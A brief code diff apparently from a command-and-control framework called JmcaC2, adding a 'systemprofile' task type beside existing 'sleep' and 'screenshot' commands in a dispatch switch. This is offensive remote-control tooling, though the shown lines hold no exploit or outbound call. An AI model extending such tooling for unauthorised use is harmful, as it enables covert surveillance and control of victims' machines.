@@ -105,6 +105,9 @@ namespace JmcaC2
                     case "sleep":
                         CreateTask(CmdPrefix, CmdArgs);
                         break;
+                    case "systemprofile":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
 
                     case "screenshot":
                         CreateTask(CmdPrefix, CmdArgs);
